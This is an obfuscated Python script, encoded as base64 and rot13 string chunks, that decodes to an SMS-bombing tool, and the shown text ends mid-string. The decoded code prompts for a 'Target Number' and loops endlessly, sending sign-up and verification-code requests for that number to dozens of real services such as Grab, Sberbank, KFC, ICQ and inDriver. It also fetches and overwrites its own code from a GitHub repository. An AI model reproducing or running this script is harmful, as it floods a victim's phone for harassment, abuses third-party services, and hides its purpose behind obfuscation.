import base64, codecs
magic = 'aW1wb3J0IHJlcXVlc3RzLCByYW5kb20sIGRhdGV0aW1lLCBzeXMsIHRpbWUsIGFyZ3BhcnNlLCBvcwpmcm9tIGNvbG9yYW1hIGltcG9ydCBpbml0LCBGb3JlLCBCYWNrLCBTdHlsZQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCmltcG9ydCB1cmxsaWIucmVxdWVzdAppbml0KCkKCnByaW50KEZvcmUuR1JFRU4gKyBCYWNrLkJMQUNLICsgU3R5bGUuQlJJR0hUICsgJycnCiAgIF9fXyAgXyAgIF8gICBfX18gX19fX18gCiAgLyAgIHx8IFwgfCB8IC8gXyBcXyAgIF98CiAvIC98IHx8ICBcfCB8LyAvX1wgXHwgfCAgCi8gL198IHx8IC4gYCB8fCAgXyAgfHwgfCAgClxfX18gIHx8IHxcICB8fCB8IHwgfHwgfCAgCiAgICB8Xy9cX3wgXF8vXF98IHxfL1xfLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKJycnICsgU3R5bGUuUkVTRVRfQUxMKQoKCiAgICAgICAgICAgIApkZWYgc2h1dGRvd24oc2lnbmFsLCBmcmFtZSk6CiAgICBwcmludCAoJ1xuXDAzM1sxOzMxbUN0cmwrQyB3YXMgcHJlc3NlZCwgc2h1dHRpbmcgZG93biFcMDMzWzBtJykKICAgIHN5cy5leGl0KCkKICAgIApkZWYgY2hlY2tpbnRlcm5ldCgpOgogICAgcmVzID0gRmFsc2UKICAgIHRyeToKICAgICAgICByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vd3d3Lmdvb2dsZS5jb20nLCB2ZXJpZnk9VHJ1ZSkKICAgICAgICByZXMgPSBGYWxzZQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXMgPSBUcnVlCiAgICBpZiByZXM6CiAgICAgICAgcHJpbnQoIlxuXG5cdEl0IHNlZW1zIFRoYXQgWW91ciBJbnRlcm5ldCBTcGVlZCBpcyBTbG93IG9yIFlvdSBBcmUgVXNpbmcgUHJveGllcy4uIikKICAgICAgICBiYW5uZXIoKQogICAgICAgIGV4aXQoKQpkZWYgdXBkYXRlKCk6CiAgICBzdHVmZl90b191cGRhdGUgPSBbJ3Ntcy5weScsICcudmVyc2lvbiddCiAgICBmb3IgZmwgaW4gc3R1ZmZfdG9fdXBkYXRlOgogICAgICAgIGRhdCA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oCiAgICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vNG5hdC9SZWJvcm4vbWFzdGVyLyIgKyBmbCkucmVhZCgpCiAgICAgICAgZmlsZSA9IG9wZW4oZmwsICd3YicpCiAgICAgICAgZmlsZS53cml0ZShkYXQpCiAgICAgICAgZmlsZS5jbG9zZSgpCiAgICBwcmludCgnXG5cdFx0VXBkYXRlZCBTdWNjZXNzZnVsbCAhISEhJykKICAgIHByaW50KCdcdFBsZWFzZSBSdW4gVGhlIFNjcmlwdCBBZ2Fpbi4uLicpCiAgICBleGl0KCkKCnRyeToKICAgIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8vd3d3Lmdvb2dsZS5jb20nKQpleGNlcHQgRXhjZXB0aW9uOgogICAgcHJpbnQoIllvdSBhcmUgbm90IGNvbm5lY3RlZCBUbyBJbnRlcm5ldCEhISIpCiAgICBwcmludCgiXHRQbGVhc2UgQ29ubmVjdCBUbyBJbnRlcm5ldCBUbyBDb250aW51ZS4uLlxuIikKICAgIGlucHV0KCdFeGl0aW5nLi4uLlxuIFByZXNzIEVudGVyIFRvIENvbnRpbnVlLi4uLicpCiAgICBleGl0KCkKcHJpbnQoJ1x0Q2hlY2tpbmcgRm9yIFVwZGF0ZXMuLi4nKQp2ZXIgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKAogICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS80bmF0L1JlYm9ybi9tYXN0ZXIvLnZlcnNpb24iKS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpCnZlcmwgPSAnJwp0cnk6CiAgICB2ZXJsID0gb3BlbigiLnZlcnNpb24iLCAncicpLnJlYWQoKQpleGNlcHQgRXhjZXB0aW9uOgogICAgcGFzcwppZiB2ZXIgIT0gdmVybDoKICAgIHByaW50KCdcdFx0VXBkYXRlIGlzIEF2YWlsYWJsZS4uLi4nKQogICAgcHJpbnQoJ1x0U3RhcnRpbmcgVXBkYXRlLi4uJykKICAgIHVwZGF0ZSgpCnByaW50KCJZb3VyIFZlcnNpb24gaXMgVXAtVG8tRGF0ZSIpCnRyeToKICAgIG5vdGkgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKAogICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vNG5hdC9SZWJvcm4vbWFzdGVyLy5ub3RpZnkiKS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpCiAgICBub3RpID0gbm90aS51cHBlcigpLnN0cmlwKCkKICAgIGlmIGxlbihub3RpKSA+IDEwOgogICAgICAgIHByaW50KCdcblxuXHROT1RJRklDQVRJT046ICcgKyBub3RpICsgJ1xuXG4nKQpleGNlcHQgRXhjZXB0aW9uOgogICAgcGFzcwogICAgCiAgICAKICAgIApfcGhvbmUgPSBpbnB1dCgnRW50ZXIgVGFyZ2V0IE51bWJlciAtLT4+ICcpCl9uYW1lID0gJycKZm9yIHggaW4gcmFuZ2UoMTIpOgoJX25hbWUgPSBfbmFtZSArIHJhbmRvbS5jaG9pY2UobGlzdCgnMTIzNDU2Nzg5cXdlcnR5dWlvcGFzZGZnaGprbHp4Y3Zibm1RV0VSVFlVSU9QQVNERkdISktMWlhDVkJOTScpKQoJcGFzc3dvcmQgPSBfbmFtZSArIHJhbmRvbS5jaG9pY2UobGlzdCgnMTIzNDU2Nzg5cXdlcnR5dWlvcGFzZGZnaGprbHp4Y3Zibm1RV0VSVFlVSU9QQVNERkdISktMWlhDVkJOTScpKQoJdXNlcm5hbWUgPSBfbmFtZSArIHJhbmRvbS5jaG9pY2UobGlzdCgnMTIzNDU2Nzg5cXdlcnR5dWlvcGFzZGZnaGprbHp4Y3Zibm1RV0VSVFlVSU9QQVNERkdISktMWlhDVkJOTScpKQoKX3Bob25lOSA9IF9waG9uZVsxOl0KX3Bob25lQXJlc0JhbmsgPSAnKycrX3Bob25lWzBdKycoJytfcGhvbmVbMTo0XSsnKScrX3Bob25lWzQ6N10rJy0nK19waG9uZVs3OjldKyctJytfcGhvbmVbOToxMV0KX3Bob25lOWRvc3RhdmlzdGEgPSBfcGhvbmU5WzozXSsnKycrX3Bob25lOVszOjZdKyctJytfcGhvbmU5WzY6OF0rJy0nK19waG9uZTlbODoxMF0KX3Bob25lT3N0aW4gPSAnKycrX3Bob25lWzBdKycrKCcrX3Bob25lWzE6NF0rJyknK19waG9uZVs0OjddKyctJytfcGhvbmVbNzo5XSsnLScrX3Bob25lWzk6MTFdCl9waG9uZVBpenphaHV0ID0gJysnK19waG9uZVswXSsnICgnK19waG9uZVsxOjRdKycpICcrX3Bob25lWzQ6N10rJyAnK19waG9uZVs3OjldKycgJytfcGhvbmVbOToxMV0KX3Bob25lR29yemRyYXYgPSBfcGhvbmVbMTo0XSsnKSAnK19waG9uZVs0OjddKyctJytfcGhvbmVbNzo5XSsnLScrX3Bob25lWzk6MTFdCgoKCgoKCml0ZXJhdGlvbiA9IDAKCgogICAgCgoKCndoaWxlIFRydWU6CglfZW1haWwgPSBfbmFtZStmJ3tpdGVyYXRpb259JysnQGdtYWlsLmNvbScKCWVtYWlsID0gX25hbWUrZid7aXRlcmF0aW9ufScrJ0BnbWFpbC5jb20nCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9wLmdyYWJ0YXhpLmNvbS9hcGkvcGFzc2VuZ2VyL3YyL3Byb2ZpbGVzL3JlZ2lzdGVyJywgZGF0YT17J3Bob25lTnVtYmVyJzogX3Bob25lLCdjb3VudHJ5Q29kZSc6ICdJRCcsJ25hbWUnOiAndGVzdCcsJ2VtYWlsJzogJ21haWxAbWFpbC5jb20nLCdkZXZpY2VUb2tlbic6ICcqJ30sIGhlYWRlcnM9eydVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS82Ni4wLjMzNTkuMTE3IFNhZmFyaS81MzcuMzYnfSkKCQlwcmludCgnWytdIEdyYWIgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gR3JhYiBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9tb3Njb3cucnV0YXhpLnJ1L2FqYXhfa2V5Y29kZS5odG1sJywgZGF0YT17J2wnOiBfcGhvbmU5fSkuanNvbigpWyJyZXMiXQoJCXByaW50KCdbK10gUnVUYXhpIFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIFJ1VGF4aSBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9iZWxrYWNhci5ydS9nZXQtY29uZmlybWF0aW9uLWNvZGUnLCBkYXRhPXsncGhvbmUnOiBfcGhvbmV9LC'
love = 'ObMJSxMKWmCKg9XDbWPKOlnJ50XPqoX10tDzIfn2SQLKVtHzIkqJImqUZtH3IwL2Imp2M1oPRaXDbWMKuwMKO0BtbWPKOlnJ50XPqoYI0tDzIfn2SQLKVtHzIkqJImqUZtEzScoTIxVFpcPtbWqUW5BtbWPKWypKIyp3EmYaOip3DbW2u0qUOmBv8iLKOcYzqiqTyhMTIlYzAioF92Zv9uqKEbY3Agpl9mMJ5xC2S1qTusqUyjMG1moKZzoT9wLJkyCKW1WljtMTS0LG17W3Obo25yK251oJWypvp6VS9jnT9hMK0fVTuyLJEypaZ9r30cPtxWpUWcoaDbW1feKFOHnJ5xMKVtHzIkqJImqUZtH3IwL2Imp2M1oPRaXDbWMKuwMKO0BtbWPKOlnJ50XPqoYI0tITyhMTIlVSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5jo3A0XPqbqUEjpmbiY2SjpP5eLKW1p2IfYaW1Y2SjnF92ZF9jnT9hMF8aYPOxLKEuCKfapTuiozHaBvOspTuiozI9YPObMJSxMKWmCKg9XDbWPKOlnJ50XPqoX10tF2SlqKAyoPOFMKS1MKA0plOGqJAwMKAmMaIfVFpcPtyyrTAypUD6PtxWpUWcoaDbW1fgKFOYLKW1p2IfVSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5jo3A0XPqbqUEjpmbiY2SjnF50nJ5eo2MzYaW1Y3LkY3AcM25sqKNaYPOxLKEuCKfapTuiozHaBvNaXlpeK3Obo25ysFjtnTIuMTIlpm17sFxXPDyjpzyhqPtaJlgqVSEcozgiMzLtHzIkqJImqUZtH3IwL2Imp2M1oPRaXDbWMKuwMKO0BtbWPKOlnJ50XPqoYI0tITyhn29zMvOFMKS1MKA0plOTLJyfMJDuWlxXPty0pax6PtxWpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl9upTxhoKEmqULhpaHiqwRiqKAypaZaYPOdp29hCKfaoKAcp2EhWmbtK3Obo25ysFjtnTIuMTIlpm17sFxXPDyjpzyhqPtaJlgqVR1HHlOFMKS1MKA0plOGqJAwMKAmMaIfVFpcPtyyrTAypUD6PtxWpUWcoaDbW1fgKFOAISZtHzIkqJImqUZtEzScoTIxVFpcPtbWqUW5BtbWPKWypKIyp3EmYaOip3DbW2u0qUOmBv8irJ91oTRhpaHiq2IvYJSjnF9uqKEbY3WypKIyp3EsL29xMFpfVTEuqTR9rlqjnT9hMFp6VS9jnT9hMK0cPtxWpUWcoaDbW1feKFOMo3IfLFOFMKS1MKA0plOGqJAwMKAmMaIfVFpcPtyyrTAypUD6PtxWpUWcoaDbW1fgKFOMo3IfLFOFMKS1MKA0plOTLJyfMJDuWlxXPty0pax6PtxWpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl9jnKc6LJu1qP5lqF9uL2AiqJ50Y3Oup3A3o3WxYKWyp2I0WljtMTS0LG17W3Wyp2I0K2W5WmbapTuiozHaYPNaLJA0nJ9hK2yxWmbapTSmpl1lMJAiqzIlrFpfVPqjnT9hMFp6VS9jnT9hMIOcracunUI0YPNaK3Ein2IhWmbaXvq9XDbWPKOlnJ50XPqoX10tHTy6rzSVqKDtHzIkqJImqUZtH3IwL2Imp2M1oPRaXDbWMKuwMKO0BtbWPKOlnJ50XPqoYI0tHTy6rzSVqKDtHzIkqJImqUZtEzScoTIxVFpcPtbWqUW5BtbWPKWypKIyp3EmYaOip3DbW2u0qUOmBv8iq3q3YaWuLz90LF5lqF9lMJ1cozDaYPOxLKEuCKfaL3WyMTIhqTyuoPp6VS9jnT9hMK0cPtxWpUWcoaDbW1feKFOFLJWiqTRtHzIkqJImqUZtH3IwL2Imp2M1oPRaXDbWMKuwMKO0BtbWPKOlnJ50XPqoYI0tHzSvo3EuVSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5jo3A0XPqbqUEjpmbiY3q3ql5moKAcoaDhpaHiLzy0pzy4Y3EyoKOfLKEypl9moKAsnJ50MJjinJ5woUIxMF9unzS4HzIanKA0pzS0nJ9hIUWcM2qypv5jnUNaYPOxLKEuCKfaozSgMFp6VS9hLJ1yYPqjnT9hMFp6VS9jnT9hMFjtW3Olo21iWmbtW3yyoTkiq2Mipz1uW30cPtxWpUWcoaDbW1feKFOGoKAcoaDtHzIkqJImqUZtH3IwL2Imp2M1oPRaXDbWMKuwMKO0BtbWPKOlnJ50XPqoYI0tH21mnJ50VSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5aMKDbW2u0qUOmBv8iq3q3Yz95o3Wio21mYzAioF9upTxipUquY2qyozIlLKEyo3EjC3Obo25yCFpeK3Obo25yBFfaWzAiqJ50paysL29xMG0yZxV3Wz5iMQ00WzkiL2SfMG1yovpcPtxWpUWcoaDbW1feKFOirJ9lo29gplOFMKS1MKA0plOGqJAwMKAmMaIfVFpcPtyyrTAypUD6PtxWpUWcoaDbW1fgKFOirJ9lo29gplOFMKS1MKA0plOTLJyfMJDuWlxXPty0pax6PtxWpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl93q3phoKMcMTIiYaW1Y2yhqTIlozSfYKWyp3DgLKOcY2AioJ1iov9uqTpipzImqP9uL3EipaZiIzIlnJMcL2S0nJ9hDJA0o3ViM2I0D29xMHMipx90pPpfVUOupzSgpm17W3OuM2IBLJ1yWmbtW2kiM2yhDayIp2IlHTuiozIJMKWcMzywLKEco24aYPNaMaWioHAbMJAeo3I0WmbtW2MuoUAyWljaMaWioIWyM2ymqTIlHTSaMFp6VPq0paIyWljap25Zo2qcovp6VPpaYPqvpTpaBvNaWljap25Dpz92nJEypxyxWmbtWlq9YPOxLKEuCKfapTuiozHaBvOspTuiozHfW2pgpzIwLKO0L2uuYKWyp3OioaAyWmbtWlpfW3WyL2SjqTAbLFp6VPqiovq9XDbWPKOlnJ50XPqoX10tGIMcMTIiVSWypKIyp3EmVSA1L2Ayp3AzqJjuWlxXPJI4L2IjqQbXPDyjpzyhqPtaJl1qVR1JnJEyolOFMKS1MKA0plOTLJyfMJDuWlxXPty0pax6PtxWpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl9hMKqhMKu0YaW1Y2qlLKObpJjaYPOdp29hCKfao3OypzS0nJ9hGzSgMFp6VPqlMJqcp3ElLKEco24aYPNaqzSlnJSvoTImWmbtrlqwoTyyoaDaBvO7W2McpaA0GzSgMFp6VPsQt8XQj4YPxZBQjbYQtfXLj4CPt8BPjcQQt8XPj4YPffBQjbCQtfXDj4CPtfBPjeQQt8XQj4YPxZBQjbYQtfX9WljtW2kup3EBLJ1yWmbtW8BQjbCQtfXDj4CPtfBPjcwQt8XQj4YPxZBQjbYQtfXlj4CPt8BPjcQQt8XPj4YPfZBQjbCQtfXDj4CPtfBPje3Qt8XQj4YPxZBQjbYQtfX+j4CPt8BPjcQQt8XPj4YPfvpfVPqjnT9hMFp6VS9jnT9hMFjaqUyjMHgyrKZaBvOoW1IhMJ1joT95MJDaKK19YPqkqJIlrFp6VPqgqKEuqTyiovOlMJqcp3ElLKEco24bWTAfnJIhqQbtD2kcMJ50FJ5jqKDuXFO7WlqpovNtpzIanKA0pzS0nJ9hXTAfnJIhqQbtWTAfnJIhqPxtrlpaKT4tVPNtqT9eMJ5povNtVPOsK3E5pTIhLJ1yKT4tVU1poa1povq9XDbWPKOlnJ50XPqoX10tozI3ozI4qPOFMKS1MKA0plOGqJAwMKAmMaIfVFpcPtyyrTAypUD6PtxWpUWcoaDbW1fgKFOhMKqhMKu0VSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5jo3A0XPqbqUEjpmbiY2SjnF5mqJ5fnJqbqP5hMKDiqwZiL3ImqT9gMKWmY2S1qTuipzy6LKEco24iWljtMTS0LG17W3Obo25yWmbtK3Obo25ysFxXPDyjpzyhqPtaJlgqVSA1ozkcM2u0VSWypKIyp3EmVSA1L2Ayp3AzqJjuWlxXPJI4L2IjqQbXPDyjpzyhqPtaJl1qVSA1ozkcM2u0VSWypKIyp3EmVRMunJkyMPRaXDbXPKElrGbXPDylMKS1MKA0pl5jo3A0XPqbqUEjpmbiY2SfpTSlnF5wo20iLKOcY3W1Y3Olo3EyL3Eco24iMTIfnKMypv8lMwR3BTVkAmx5ZTAuATV3BGNmLJR4ZmEvBJL1ATZlLmOvL2VjZJRlYlpfVTcmo249rlqwoTyyoaEsqUyjMFp6VPqjMKWmo25uoPpfVPqyoJScoPp6VS9yoJScoPjtW21iLzyfMI9jnT9hMFp6VS9jnT9hMFjtW2EyoTy2MKW5G3O0nJ9hWmbtW3Agplq9XDbWPKOlnJ50XPqoX10tLJkjLKWcVSWypKIyp3EmVSA1L2Ayp3AzqJjuWlxXPJI4L2IjqQbXPDyjpzyhqPtaJl1qVTSfpTSlnFOFMKS1MKA0plOTLJyfMJDuWlxXPty0pax6PtxWpzIkqJImqUZhpT9mqPtanUE0pUZ6Yl9fnl5coaMcqUWiYaW1Y2keZv9fn2RipTS0nJIhqP9lMJMlMKAbD29xMFpfVTEuqTR9rlqjnT9hMFp6VS9jnT9hMK0cPtxWpUWcoaDbW1feKFOWoaMcqUWiVSWypKIyp3EmVSA1L2Ayp3AzqJjuWlxXPJI4L2IjqQbXPDyjpzyhqPtaJl1qVRyhqzy0pz8tHzIkqJImqUZtEzScoTIxVFpcPtbWqUW5BtbWPKWypKIyp3EmYaOip3DbW2u0qUOmBv8io25fnJ5yYaAvnKZhpaHipzIaY3AypaMcL2HiWljtnaAiow17W2cmo25lpTZaBvplYwNaYPqjpz90o2AioPp6WmHaYPqgMKEbo2DaBvsQt8XQj4YPxZBQjbYQtfXsj4CPt8BPjcQQt8XPj4YPifBQjbCQtfXDj4CPtfBPjeiQt8XQj4YPxpBQjbYQ'
god = 'gsKMw4PCg8OCwpDDg8KCw4LCt8ODwoPDgsKQw4PCgsOCwr7Dg8KDw4LCkMODwoLDgsKyw4PCg8OCwpDDg8KCw4LCsMODwoPDgsKRw4PCgsOCwoLDg8KDw4LCkMODwoLDgsK1w4PCg8OCwpDDg8KCw4LCu8ODwoPDgsKRw4PCgsOCwowuw4PCg8OCwpDDg8KCw4LCl8ODwoPDgsKQw4PCgsOCwrDDg8KDw4LCkcODwoLDgsKPw4PCg8OCwpDDg8KCw4LCssODwoPDgsKQw4PCgsOCwrrDg8KDw4LCkMODwoLDgsKww4PCg8OCwpDDg8KCw4LCncODwoPDgsKQw4PCgsOCwrDDg8KDw4LCkMODwoLDgsKkw4PCg8OCwpDDg8KCw4LCuMODwoPDgsKQw4PCgsOCwrfDg8KDw4LCkMODwoLDgsK4w4PCg8OCwpDDg8KCw4LCusODwoPDgsKQw4PCgsOCwrAnLCdwYXJhbXMnOnsncGhvbmUnOl9waG9uZX0sJ2lkJzonMSd9KQoJCXByaW50KCdbK10gU2JlcmJhbmsgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gU2JlcmJhbmsgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vaWIucHNiYW5rLnJ1L2FwaS9hdXRoZW50aWNhdGlvbi9leHRlbmRlZENsaWVudEF1dGhSZXF1ZXN0JywganNvbj17J2ZpcnN0TmFtZSc6J8ODwoPDgsKQw4PCgsOCwpjDg8KDw4LCkMODwoLDgsKyw4PCg8OCwpDDg8KCw4LCsMODwoPDgsKQw4PCgsOCwr0nLCdtaWRkbGVOYW1lJzonw4PCg8OCwpDDg8KCw4LCmMODwoPDgsKQw4PCgsOCwrLDg8KDw4LCkMODwoLDgsKww4PCg8OCwpDDg8KCw4LCvcODwoPDgsKQw4PCgsOCwr7Dg8KDw4LCkMODwoLDgsKyw4PCg8OCwpDDg8KCw4LCuMODwoPDgsKRw4PCgsOCwocnLCdsYXN0TmFtZSc6J8ODwoPDgsKQw4PCgsOCwpjDg8KDw4LCkMODwoLDgsKyw4PCg8OCwpDDg8KCw4LCsMODwoPDgsKQw4PCgsOCwr3Dg8KDw4LCkMODwoLDgsK+w4PCg8OCwpDDg8KCw4LCsicsJ3NleCc6JzEnLCdiaXJ0aERhdGUnOicxMC4xMC4yMDAwJywnbW9iaWxlUGhvbmUnOiBfcGhvbmU5LCdydXNzaWFuRmVkZXJhdGlvblJlc2lkZW50JzondHJ1ZScsJ2lzRFNBJzonZmFsc2UnLCdwZXJzb25hbERhdGFQcm9jZXNzaW5nQWdyZWVtZW50JzondHJ1ZScsJ2JLSVJlcXVlc3RBZ3JlZW1lbnQnOidudWxsJywncHJvbW90aW9uQWdyZWVtZW50JzondHJ1ZSd9KQoJCXByaW50KCdbK10gUHNiYW5rIFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIFBzYmFuayBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9teWFwaS5iZWx0ZWxlY29tLmJ5L2FwaS92MS9hdXRoL2NoZWNrLXBob25lP2xhbmc9cnUnLCBkYXRhPXsncGhvbmUnOiBfcGhvbmV9KQoJCXByaW50KCdbK10gQmVsdGVsY29tIFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIEJlbHRlbGNvbSBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcHAua2FydXNlbC5ydS9hcGkvdjEvcGhvbmUvJywgZGF0YT17J3Bob25lJzogX3Bob25lfSkKCQlwcmludCgnWytdIEthcnVzZWwgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gS2FydXNlbCBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcHAtYXBpLmtmYy5ydS9hcGkvdjEvY29tbW9uL2F1dGgvc2VuZC12YWxpZGF0aW9uLXNtcycsIGpzb249eydwaG9uZSc6ICcrJyArIF9waG9uZX0pCgkJcHJpbnQoJ1srXSBLRkMgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gS0ZDIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2FwaS5jYXJzbWlsZS5jb20vIixqc29uPXsib3BlcmF0aW9uTmFtZSI6ICJlbnRlclBob25lIiwgInZhcmlhYmxlcyI6IHsicGhvbmUiOiBfcGhvbmV9LCJxdWVyeSI6ICJtdXRhdGlvbiBlbnRlclBob25lKCRwaG9uZTogU3RyaW5nISkge1xuICBlbnRlclBob25lKHBob25lOiAkcGhvbmUpXG59XG4ifSkKCQlwcmludCgnWytdIGNhcnNtaWxlIFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIGNhcnNtaWxlIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5jaXRpbGluay5ydS9yZWdpc3RyYXRpb24vY29uZmlybS9waG9uZS8rJyArIF9waG9uZSArICcvJykKCQlwcmludCgnWytdIENpdGlsaW5rIFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIENpdGlsaW5rIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2FwaS5kZWxpdGltZS5ydS9hcGkvdjIvc2lnbnVwIixkYXRhPXsiU2lnbnVwRm9ybVt1c2VybmFtZV0iOiBfcGhvbmUsICJTaWdudXBGb3JtW2RldmljZV90eXBlXSI6IDN9KQoJCXByaW50KCdbK10gRGVsaXRpbWUgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gRGVsaXRpbWUgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9maW5kY2xvbmUucnUvcmVnaXN0ZXInLCBwYXJhbXM9eydwaG9uZSc6ICcrJyArIF9waG9uZX0pCgkJcHJpbnQoJ1srXSBmaW5kY2xvbmUgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gZmluZGNsb25lIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL2d1cnUudGF4aS9hcGkvdjEvZHJpdmVyL3Nlc3Npb24vdmVyaWZ5Iixqc29uPXsicGhvbmUiOiB7ImNvZGUiOiAxLCAibnVtYmVyIjogX3Bob25lfX0pCgkJcHJpbnQoJ1srXSBHdXJ1IFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIEd1cnUgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3LmljcS5jb20vc21zcmVnL3JlcXVlc3RQaG9uZVZhbGlkYXRpb24ucGhwJyxkYXRhPXsnbXNpc2RuJzogX3Bob25lLCAibG9jYWxlIjogJ2VuJywgJ2NvdW50cnlDb2RlJzogJ3J1JywndmVyc2lvbic6ICcxJywgImsiOiAiaWMxcnR3ejFzMUhqMU8wciIsICJyIjogIjQ2NzYzIn0pCgkJcHJpbnQoJ1srXSBJQ1EgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gSUNRIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCJodHRwczovL3RlcnJhLTEuaW5kcml2ZXJhcHAuY29tL2FwaS9hdXRob3JpemF0aW9uP2xvY2FsZT1ydSIsZGF0YT17Im1vZGUiOiAicmVxdWVzdCIsICJwaG9uZSI6ICIrIiArIF9waG9uZSwicGhvbmVfcGVybWlzc2lvbiI6ICJ1bmtub3duIiwgInN0cmVhbV9pZCI6IDAsICJ2IjogMywgImFwcHZlcnNpb24iOiAiMy4yMC42Iiwib3N2ZXJzaW9uIjogInVua25vd24iLCAiZGV2aWNlbW9kZWwiOiAidW5rbm93biJ9KQoJCXByaW50KCdbK10gSW5Ecml2ZXIgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gSW5Ecml2ZXIgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoImh0dHBzOi8vbGsuaW52aXRyby5ydS9zcC9tb2JpbGVBcGkvY3JlYXRlVXNlckJ5UGFzc3dvcmQiLCBkYXRhPXsicGFzc3dvcmQiOiBwYXNzd29yZCwgImFwcGxpY2F0aW9uIjogImxrcCIsICJsb2dpbiI6ICIrIiArIF9waG9uZX0pCgkJcHJpbnQoJ1srXSBJbnZpdHJvIFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIEludml0cm8gUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vdWJlLnBtc20ub3JnLnJ1L2VzYi9pcW9zLXBob25lL3ZhbGlkYX'
